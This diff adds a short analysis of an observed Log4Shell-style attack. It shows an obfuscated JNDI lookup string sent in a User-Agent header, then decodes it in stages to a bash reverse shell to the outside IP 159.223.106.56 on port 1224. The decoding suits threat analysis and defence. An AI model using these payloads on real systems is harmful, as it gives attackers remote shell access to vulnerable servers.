@@ -1,0 +1,11 @@
+***Stage 1 UserAgent in GET
+
+${${nuDV:CW:yqL:dWTUHX:-j}n${obpOW:C:-d}${ll:-i}:${GI:-l}d${YRYWp:yjkg:wrsb:RajYR:-a}p://159.223.106.56:1420/Basic/Command/Base64/YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TlRrdU1qSXpMakV3Tmk0MU5pOHhNakkwSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQ==}
+
+***Stage 2 Decoded command 
+
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTkuMjIzLjEwNi41Ni8xMjI0IDA+JjE=}|{base64,-d}|{bash,-i}
+
+***Stage 3 Decoded command 
+
+bash -i >& /dev/tcp/159.223.106.56/1224 0>&1 ****[REVERSE SHELL]****
